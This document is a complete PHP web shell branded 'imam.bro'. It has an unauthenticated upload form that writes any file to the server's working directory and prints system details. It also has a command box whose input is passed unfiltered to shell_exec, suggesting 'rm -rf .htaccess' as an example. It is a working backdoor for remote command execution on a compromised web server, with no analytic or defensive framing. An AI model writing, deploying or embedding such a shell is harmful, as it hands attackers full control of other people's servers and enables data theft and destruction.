<html><head>
<title>imam.bro</title>
</head><body>
<pre><center>
<?php if(isset($_FILES["userfile"]["name"])){ $uploaddir = getcwd() . "/"; $uploadfile = $uploaddir . basename($_FILES["userfile"]["name"]); echo "<p>"; if (move_uploaded_file($_FILES["userfile"]["tmp_name"], $uploadfile)) { echo "Upload Successful\n"; } else { echo "Failed To Uploadw";} echo "</p>"; echo "<pre>"; echo "Information :\n"; echo "Your Directory Is :"; echo getcwd() . "\n"; print_r($_FILES); if ($_FILES["userfile"]["error"] == 0){ echo "<br><br><a href=\"{$_FILES["userfile"]["name"]}\" TARGET=_BLANK>{$_FILES["userfile"]["name"]}</a><br><br>"; echo getcwd() . "\n"; } echo "</pre>"; } echo "<form enctype=\"multipart/form-data\" action=\"{$_SERVER["PHP_SELF"]}\" method=\"POST\">"; echo "<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"512000\" />"; echo "Select Your File : <input name=\"userfile\" type=\"file\" />"; echo "<input type=\"submit\" value=\"Upload\" />"; echo "</form>"; echo "imam.bro";
echo "<br>".php_uname()."<br>";  ?><br>
<?php echo getcwd() . "\n"; ?>
Command <form method="POST" action=""> <input type="text" name="cmd" placeholder="rm -rf .htaccess"> <input type="submit" value=">>"> 
</form> <?php $cmd = $_POST['cmd']; $exec = shell_exec("$cmd"); 
echo "<textarea rows='15' cols='85'>$exec</textarea>"; ?>
</pre></center>
</body>
</html>